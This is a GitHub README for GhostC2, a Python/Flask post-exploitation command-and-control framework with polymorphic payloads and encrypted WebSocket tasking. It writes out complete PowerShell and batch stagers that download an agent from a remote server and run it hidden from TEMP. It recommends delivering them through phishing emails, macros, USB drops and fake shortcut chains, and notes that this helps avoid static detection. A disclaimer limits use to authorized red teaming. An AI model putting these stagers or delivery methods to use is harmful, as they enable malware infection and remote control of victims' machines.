# 👻 GhostC2

GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, operator authentication, and optional `.exe` packaging. 

Check out the wiki for an Operator Quickstart Guide.

---

## 🚀 Features

- 🔐 AES-256 encrypted communication (symmetric)
- 🌐 Real-time bidirectional WebSocket tasking
- 🧠 Operator web console with live terminal view
- 🧬 Polymorphic payload generator with randomized variables
- 🖥️ Optional `.exe` compilation with PyInstaller
- 🛡️ Flask-Login based access control
- 🧾 SQLite-based task/result logging

---

## 📁 Project Structure

```
GhostC2/
├── builds/                 # Compiled payloads (.py, .exe)
├── output/                 # (Optional legacy output dir)
├── payloads/               # WebSocket and polling Python agents
│   └── ghost_socket_payload.py
├── server/
│   ├── app.py              # Main Flask + SocketIO server
│   └── templates/          # HTML templates for dashboard, console, login
├── tools/
│   └── generate_payload.py # Payload generator script
├── utils/
│   └── crypto.py           # AES encrypt/decrypt helpers
└── README.md
```

---

## ⚙️ Setup

### 1. Install dependencies
```bash
pip install flask flask-login flask-socketio eventlet pyinstaller
```

### 2. Run the server
```bash
cd server
python app.py
```

Visit [http://localhost:8080](http://localhost:8080)

**Default Login:**
```
Username: admin
Password: ghostpass123


```
### or simply run the setup.sh file.
---

## 👾 Payloads

### ✅ WebSocket Agent *currently being worked on use payload generator(!recommeneded) or ghost_payload.py(default payload for testing)*
```bash
python payloads/ghost_socket_payload.py
```

### 🧬 Generate Polymorphic Payload
```bash
python tools/generate_payload.py            # .py only
python tools/generate_payload.py --exe      # .py + .exe
```

Output saved to `builds/`

---

## 🖥️ Operator Console

- Live terminal view via `/console`
- Send commands to selected host
- Output streams back instantly via WebSocket

---

### 🎯 Stagers (Initial Access)

GhostC2 includes multiple **delivery stagers** in the `/stagers` directory, designed to fetch and execute the full agent from a remote server.

#### 🪖 PowerShell Stager (`payload_stager.ps1`)

Downloads and executes the payload from your GhostC2 host:

$payloadUrl = "http://your.server.ip/builds/ghost_payload.exe"
$localPath = "$env:TEMP\ghostsvc.exe"
Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
Start-Process -FilePath $localPath -WindowStyle Hidden

yaml
Copy
Edit

Use in:
- Phishing emails
- Macros
- USB drops
- Post-exploit scripting

---

#### 🧱 Batch Stager (`payload_stager.bat`)

Simple `.bat` version for Windows:

@echo off
set PAYLOAD_URL=http://your.server.ip/builds/ghost_payload.exe
set PAYLOAD_PATH=%TEMP%\ghostsvc.exe

powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%PAYLOAD_PATH%' -UseBasicParsing"
start "" "%PAYLOAD_PATH%"

yaml
Copy
Edit

Use in:
- `.zip` phishing drops
- Fake `.lnk` shortcut chains
- Legacy script execution

---

### 🔐 Reminder

These stagers **do not contain the payload directly**. They fetch the compiled GhostC2 `.exe` agent at runtime — minimizing static detection and enabling modular deployment.



---




## 🔐 Security Notes

- All beacon traffic is AES-256 encrypted
- WebSocket messages are encrypted client/server-side
- Operators must log in via Flask-Login (sessions stored securely)

---

## 🧪 Red Team Use Cases

| Scenario              | Usage                                    |
|----------------------|------------------------------------------|
| Post-exploitation    | Remote shell via encrypted WebSocket     |
| Payload generation   | Obfuscated `.py` or `.exe` files         |
| Operator dashboards  | Web UI for task/result review            |
| C2 simulations       | Train detection or analyze traffic       |

---

## ⚠️ Legal

GhostC2 is provided for **educational and authorized red team use only**. Do not deploy this tool in any environment without proper authorization.

---

## 🧠 Built by Edward Wolfgang

- GitHub: [@wolfwashere](https://github.com/wolfwashere)
- Project: GhostC2 v1.0

Feel free to fork, contribute, or adapt for your research lab, red team, or academic project.
